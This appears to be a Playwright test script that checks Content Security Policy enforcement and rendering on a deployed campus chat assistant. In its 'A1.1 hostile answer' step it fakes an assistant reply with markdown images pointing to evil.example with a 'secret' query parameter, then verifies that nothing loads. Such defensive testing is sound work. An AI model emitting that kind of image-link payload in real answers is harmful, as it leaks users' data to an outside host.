// Walks the paths named in the CSP enforcement rule on the live site and records
// every violation. Usage: node csp-check.mjs chrome|firefox|webkit
// Screenshots only in the separate pass at the end, with no detector: see README.md.
import { chromium, firefox, webkit } from "playwright";
import { mkdirSync, writeFileSync } from "node:fs";

const BASE = "https://campus-assistant.denmarkeast.cloudapp.azure.com";
const QUESTION = "What are the prerequisites for ACC 2302?";
const which = process.argv[2];
const shots = `shots-${which}`;
mkdirSync(shots, { recursive: true });

const browser =
  which === "chrome"
    ? await chromium.launch({ channel: "chrome" })
    : which === "webkit"
      ? await webkit.launch()
      : await firefox.launch();
const browserVersion = browser.version();
console.log(`browser: ${which} ${browserVersion}`);

const results = {}; // step -> { violations, console, pageErrors, failed, notes }
let step = "setup";
const bucket = () =>
  (results[step] ??= { violations: [], console: [], pageErrors: [], failed: [], notes: [] });
const note = (text) => bucket().notes.push(text);

const context = await browser.newContext({ colorScheme: "light", locale: "en-US" });
const page = await context.newPage();

// The event every browser fires for a violation, report-only included. It's
// reported straight to Node, so a page load can't lose what was collected.
await context.exposeBinding("__cspReport", (_src, v) => bucket().violations.push(v));
await context.addInitScript(() => {
  document.addEventListener("securitypolicyviolation", (e) =>
    window.__cspReport({
      page: location.origin,
      directive: e.effectiveDirective,
      blocked: e.blockedURI,
      disposition: e.disposition,
      source: e.sourceFile,
      line: e.lineNumber,
      sample: e.sample,
    }),
  );
});
page.on("console", (m) => {
  if (["error", "warning"].includes(m.type())) bucket().console.push(`${m.type()}: ${m.text()}`);
});
page.on("pageerror", (e) => bucket().pageErrors.push(String(e)));
page.on("requestfailed", (r) => bucket().failed.push(`${r.url()} ${r.failure()?.errorText}`));

const settle = (ms = 800) => page.waitForTimeout(ms);
const open = async (hash = "") => {
  await page.goto(`${BASE}/${hash}`, { waitUntil: "networkidle" });
  await page.evaluate(() => document.fonts.ready);
  await settle();
};

// 1. First screen
step = "1 first screen";
await open();
await page.locator(".example").first().waitFor();
note(`${await page.locator(".example").count()} examples shown`);
note(`fonts loaded: ${await page.evaluate(() => [...document.fonts].filter((f) => f.status === "loaded").length)}`);

// 2. Every example replay, with its panels opened (they set widths from the DOM)
step = "2 example replay";
const exampleCount = await page.locator(".example").count();
let chatCallsDuringReplay = 0;
const countChat = (r) => {
  if (r.url().endsWith("/api/chat")) chatCallsDuringReplay++;
};
page.on("request", countChat);
for (let i = 0; i < exampleCount; i++) {
  await open();
  await page.locator(".example").nth(i).click();
  await page.locator("section.sources").waitFor({ timeout: 60000 });
  await page.locator("textarea").and(page.locator(":enabled")).waitFor();
  await settle();
  const panels = page.locator("details.uth > summary, details.steps-summary > summary");
  const panelCount = await panels.count();
  for (let p = 0; p < panelCount; p++) await panels.nth(p).click();
  await settle(400);
  note(`example ${i + 1}: replayed, ${panelCount} panel(s) opened`);
}
page.off("request", countChat);
note(`POST /api/chat during replays: ${chatCallsDuringReplay}`);

// 3. One live question: the path that exercises connect-src. Spends quota.
let liveAnswered = process.env.SKIP_LIVE ? "skipped" : false;
if (!process.env.SKIP_LIVE) {
  step = "3 live question";
  await open();
  const chatResponse = page.waitForResponse((r) => r.url().endsWith("/api/chat"), { timeout: 60000 });
  await page.locator("textarea").fill(QUESTION);
  await page.locator('button[aria-label="Send question"]').click();
  const response = await chatResponse;
  note(`POST ${new URL(response.url()).pathname} -> ${response.status()}`);
  await Promise.race([response.finished(), page.waitForTimeout(150000)]);
  await settle(1500);
  const answer = (await page.locator(".thread").innerText()).replace(/\s+/g, " ");
  const sources = await page.locator("section.sources").count();
  note(`sources section shown: ${sources}`);
  note(`answer starts: ${answer.slice(0, 170)}`);
  liveAnswered = response.status() === 200 && sources > 0;
}

// 3b. One click on a source link: opens a new tab through GET /api/sources/...
step = "3b source link";
if ((await page.locator("section.sources a").count()) === 0) {
  await open();
  await page.locator(".example").first().click();
  await page.locator("section.sources").waitFor({ timeout: 60000 });
  await settle();
}
const sourceHops = [];
const onSourceResponse = (r) => {
  if (r.url().includes("/api/sources/")) {
    sourceHops.push(`${new URL(r.url()).pathname}${new URL(r.url()).search} -> ${r.status()} ${r.headers().location ?? ""}`);
  }
};
context.on("response", onSourceResponse);
const onAnyRequest = (r) => {
  if (r.url().includes("/api/sources/") || !r.url().startsWith(BASE)) note(`tab request: ${r.url().slice(0, 110)}`);
};
const onAnyFailed = (r) => note(`tab request failed: ${r.url().slice(0, 90)} ${r.failure()?.errorText}`);
context.on("request", onAnyRequest);
context.on("requestfailed", onAnyFailed);
const sourceLink = page.locator("section.sources a").first();
note(`link: ${await sourceLink.getAttribute("href")} target=${await sourceLink.getAttribute("target")}`);
const [popup] = await Promise.all([context.waitForEvent("page", { timeout: 20000 }), sourceLink.click()]);
popup.on("download", (d) => note(`tab download: ${d.url().slice(0, 110)}`));
await popup.waitForLoadState("domcontentloaded", { timeout: 30000 }).catch((e) => note(`tab load: ${e.name}`));
// Waits on the app's own tab: a browser with no PDF viewer can close the new one.
await page.waitForTimeout(8000);
for (const hop of sourceHops) note(hop);
note(`new tab ended at: ${popup.url()}${popup.isClosed() ? " (the tab closed itself)" : ""}`);
note(`opener still on the app: ${page.url().startsWith(BASE)}`);
context.off("response", onSourceResponse);
context.off("request", onAnyRequest);
context.off("requestfailed", onAnyFailed);
if (!popup.isClosed()) await popup.close();

// 4. About page (fetches /limits)
step = "4 about page";
await open();
const limits = page.waitForResponse((r) => r.url().endsWith("/api/limits"), { timeout: 15000 });
await page.locator('nav.nav a[href="#about"]').click();
const limitsResponse = await limits;
note(`GET ${new URL(limitsResponse.url()).pathname} -> ${limitsResponse.status()}`);
await page.locator("article.about").waitFor();
await settle();

// 5. Diagram zoom: the button and the dialog exist only at phone width
step = "5 diagram zoom";
const zoomAtPhoneWidth = async () => {
  await page.setViewportSize({ width: 390, height: 844 });
  await open("#about");
  await page.locator(".figure-zoom").click();
  await page.locator("dialog.zoom-dialog[open]").waitFor();
  await settle();
  note(`dialog open at 390px: ${await page.locator("dialog.zoom-dialog[open]").count()}`);
  await page.locator('dialog.zoom-dialog button[aria-label="Close the enlarged diagram"]').click();
  await settle(400);
  await page.setViewportSize({ width: 1280, height: 720 });
};
await zoomAtPhoneWidth();

// 6. Dark mode: the toggle, a reload in dark, and the other screens in dark
step = "6 dark mode";
const themeBefore = await page.evaluate(() => document.documentElement.dataset.theme ?? "(none)");
await page.locator('button[aria-label="Switch to dark mode"]').click();
await settle();
note(`theme ${themeBefore} -> ${await page.evaluate(() => document.documentElement.dataset.theme ?? "(none)")}`);
await zoomAtPhoneWidth();
await open();
note(`after reload: ${await page.evaluate(() => document.documentElement.dataset.theme ?? "(none)")}`);
await page.locator(".example").first().click();
await page.locator("section.sources").waitFor({ timeout: 60000 });
await settle();

// Control: does this detector see a violation at all? Without this, zero means nothing.
step = "control";
await page.evaluate(() => {
  const image = new Image();
  image.src = "data:image/gif;base64,R0lGODlhAQABAAAAACw=";
  const div = document.createElement("div");
  div.setAttribute("style", "color: red");
  document.body.append(div);
});
await settle(1000);

// A1.1 on the deployed bundle: a hostile answer, faked in this browser only (the
// server is not called and no quota is used).
step = "A1.1 hostile answer";
const hostile = await browser.newContext({ colorScheme: "light", locale: "en-US" });
const hostilePage = await hostile.newPage();
const outbound = [];
hostilePage.on("request", (r) => {
  if (!r.url().startsWith(BASE) && !r.url().startsWith("data:")) outbound.push(r.url());
});
await hostilePage.route("**/api/chat", (route) =>
  route.fulfill({
    status: 200,
    contentType: "text/event-stream",
    body:
      'event: token\ndata: {"text":"Before ![leak](https://evil.example/c.png?q=secret) after ![ref][r]\\n\\n[r]: https://evil.example/ref.png"}\n\n' +
      "event: done\ndata: {}\n\n",
  }),
);
await hostilePage.goto(`${BASE}/`, { waitUntil: "networkidle" });
await hostilePage.locator("textarea").fill("test");
await hostilePage.locator('button[aria-label="Send question"]').click();
await hostilePage.getByText("Before").first().waitFor({ timeout: 15000 });
await hostilePage.waitForTimeout(1000);
const hostileImages = await hostilePage.locator(".thread img").count();
note(`<img> in thread: ${hostileImages}`);
note(`requests to other hosts: ${outbound.length} ${outbound.join(" ")}`);
note(`rendered: ${(await hostilePage.locator(".thread").innerText()).replace(/\s+/g, " ").slice(0, 120)}`);
await hostile.close();

// Screenshot pass: after counting, in a fresh context with no detector, because
// page.screenshot() itself fires a violation in WebKit (README.md). No live
// question here, so it uses no quota.
const shotContext = await browser.newContext({ colorScheme: "light", locale: "en-US" });
const shotPage = await shotContext.newPage();
const snap = (name) => shotPage.screenshot({ path: `${shots}/${name}.png` });
await shotPage.goto(`${BASE}/`, { waitUntil: "networkidle" });
await snap("1-first-screen");
await shotPage.locator(".example").first().click();
await shotPage.locator("section.sources").waitFor({ timeout: 60000 });
await shotPage.waitForTimeout(800);
await snap("2-example-replay");
await shotPage.goto(`${BASE}/#about`, { waitUntil: "networkidle" });
await shotPage.reload({ waitUntil: "networkidle" });
await snap("4-about");
await shotPage.setViewportSize({ width: 390, height: 844 });
await shotPage.reload({ waitUntil: "networkidle" });
await shotPage.locator(".figure-zoom").click();
await shotPage.locator("dialog.zoom-dialog[open]").waitFor();
await shotPage.waitForTimeout(500);
await snap("5-zoom");
await shotPage.setViewportSize({ width: 1280, height: 720 });
await shotPage.goto(`${BASE}/`, { waitUntil: "networkidle" });
await shotPage.locator('button[aria-label="Switch to dark mode"]').click();
await shotPage.waitForTimeout(500);
await snap("6-dark");
await shotContext.close();

await browser.close();
writeFileSync(`results-${which}.json`, JSON.stringify(results, null, 2));

for (const [name, r] of Object.entries(results)) {
  console.log(`\n[${name}] violations: ${r.violations.length}`);
  for (const v of r.violations) console.log(`  VIOLATION ${JSON.stringify(v)}`);
  for (const n of r.notes) console.log(`  ${n}`);
  for (const c of r.console) console.log(`  console ${c}`);
  for (const e of r.pageErrors) console.log(`  pageerror ${e}`);
  for (const f of r.failed) console.log(`  failed ${f}`);
}

// The verdict. Only violations on the app's own origin count: the tab a source
// link opens ends on another site, whose page has its own policy. Zero means
// nothing unless the control fired.
const appViolations = Object.entries(results)
  .filter(([name]) => name !== "control")
  .flatMap(([, r]) => r.violations)
  .filter((v) => v.page === new URL(BASE).origin).length;
const controlFired = results.control.violations.length;
const hostileClean = hostileImages === 0 && outbound.length === 0;
const pass = appViolations === 0 && controlFired === 2 && hostileClean && liveAnswered !== false;
console.log(
  `\nRESULT ${which} ${browserVersion}: ${pass ? "PASS" : "FAIL"} | violations ${appViolations} | control ${controlFired}/2` +
    ` | live question answered: ${liveAnswered} | hostile answer rendered no image: ${hostileClean}`,
);
process.exit(pass ? 0 : 1);
